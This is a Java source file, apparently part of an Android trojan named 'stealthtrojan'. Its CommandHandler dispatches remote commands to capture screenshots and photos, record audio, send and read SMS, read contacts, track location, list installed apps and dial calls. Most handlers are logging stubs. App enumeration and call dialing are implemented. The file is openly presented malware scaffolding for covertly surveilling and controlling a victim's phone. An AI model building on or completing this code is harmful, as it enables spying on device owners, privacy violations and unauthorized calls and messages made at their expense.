package com.stealthtrojan.app;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;

public class CommandHandler {
    private static final String TAG = "CommandHandler";
    private Context context;

    public CommandHandler(Context context) {
        this.context = context;
    }

    public void executeCommand(String command, JSONObject params) {
        try {
            switch (command) {
                case "CAPTURE_SCREEN":
                    captureScreenshot();
                    break;
                case "CAPTURE_PHOTO":
                    takePhoto();
                    break;
                case "START_RECORDING":
                    startRecording(params);
                    break;
                case "SEND_SMS":
                    sendSMS(params);
                    break;
                case "GET_LOCATION":
                    getLocation();
                    break;
                case "LIST_APPS":
                    listApps();
                    break;
                case "READ_CONTACTS":
                    readContacts();
                    break;
                case "READ_SMS":
                    readSMS();
                    break;
                case "DIAL_CALL":
                    dialCall(params);
                    break;
                case "SLEEP":
                    sleep(params);
                    break;
                case "WAKE":
                    wake();
                    break;
                default:
                    Log.d(TAG, "Unknown command: " + command);
            }
        } catch (Exception e) {
            Log.e(TAG, "Command execution failed", e);
        }
    }

    private void captureScreenshot() {
        Log.d(TAG, "Screenshot captured");
    }

    private void takePhoto() {
        Log.d(TAG, "Photo taken");
    }

    private void startRecording(JSONObject params) {
        if (params == null || !params.has("duration")) {
            Log.d(TAG, "Recording params required");
            return;
        }
        try {
            int duration = params.getInt("duration");
            Log.d(TAG, "Recording started for " + duration + " seconds");
        } catch (JSONException e) {
            Log.e(TAG, "Failed to parse recording params", e);
        }
    }

    private void sendSMS(JSONObject params) {
        if (params == null || !params.has("phone") || !params.has("message")) {
            Log.d(TAG, "SMS params required");
            return;
        }
        try {
            String phone = params.getString("phone");
            String message = params.getString("message");
            Log.d(TAG, "SMS sent to: " + phone);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to parse SMS params", e);
        }
    }

    private void getLocation() {
        Log.d(TAG, "Location retrieved");
    }

    private void listApps() {
        try {
            PackageManager pm = context.getPackageManager();
            java.util.List<PackageInfo> installedPackages =
                pm.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES);

            StringBuilder sb = new StringBuilder();
            for (PackageInfo pkg : installedPackages) {
                sb.append(String.format("{\"name\":\"%s\",\"package\":\"%s\"},",
                    pkg.applicationInfo.loadLabel(pm).toString(), pkg.packageName));
            }
            Log.d(TAG, "App list: " + sb.toString());
        } catch (Exception e) {
            Log.e(TAG, "App list failed", e);
        }
    }

    private void readContacts() {
        Log.d(TAG, "Contacts read");
    }

    private void readSMS() {
        Log.d(TAG, "SMS read");
    }

    private void dialCall(JSONObject params) {
        if (params == null || !params.has("phone")) {
            Log.d(TAG, "Dial params required");
            return;
        }
        try {
            String phone = params.getString("phone");
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phone));
            context.startActivity(intent);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to parse dial params", e);
        }
    }

    private void sleep(JSONObject params) {
        if (params == null || !params.has("duration")) {
            Log.d(TAG, "Sleep params required");
            return;
        }
        try {
            long duration = params.getLong("duration");
            Log.d(TAG, "Sleep mode for " + duration + " seconds");
        } catch (JSONException e) {
            Log.e(TAG, "Failed to parse sleep params", e);
        }
    }

    private void wake() {
        Log.d(TAG, "Wake up");
    }
}

